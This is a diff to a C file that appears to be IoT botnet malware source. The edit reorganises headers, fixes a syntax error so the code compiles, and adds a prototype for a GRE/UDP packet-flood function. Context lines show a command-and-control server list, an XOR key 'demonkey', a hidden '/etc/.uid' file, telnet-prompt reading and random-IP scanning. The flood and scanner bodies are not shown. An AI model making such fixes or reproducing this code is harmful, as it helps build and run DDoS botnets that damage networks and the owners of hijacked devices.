@@ -1,3 +1,33 @@
+#include <stdlib.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <time.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <pthread.h>
+#include <ctype.h>  // Required for isspace, toupper
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/utsname.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <strings.h>
+#include <sys/prctl.h>  // Required for prctl
+#include <stdint.h>     // For fixed-width types like uint32_t
+
+// NOTE: this file is just a cleaned-up version header-wise and to fix syntax errors.
+// Full reorganization/modernization would require more structural cleanup.
+
 #define PR_SET_NAME 15
 #define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
 #define PAD_RIGHT 1
@@ -17,32 +47,13 @@
 #define UID_PATH "/etc/.uid"
 #define XOR_KEY "demonkey"
 #define IP4_HDRLEN 20
-#define ICMP_HDRLEN 8#include <stdlib.h>
-#include <stdarg.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <time.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <pthread.h>
+#define ICMP_HDRLEN 8
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/utsname.h>
-#include <sys/wait.h>
-#include <sys/ioctl.h>
+// Function prototypes (add more here as needed)
 
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-#include <netinet/tcp.h>
-#include <net/if.h>
 
-#include <arpa/inet.h>
-#include <netdb.h>
-#include <strings.h>
+
+
 
 
 unsigned char *commServer[] =
@@ -628,7 +639,8 @@ int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutu
 
 static uint8_t ipState[5];
 
-
+void send_gre_udp_packets(const char *dst_ip, int port, int packetsize, int secs);
+unsigned short csum(unsigned short *buf, int nwords);
 in_addr_t getRandomIP(in_addr_t netmask)
 {
         in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
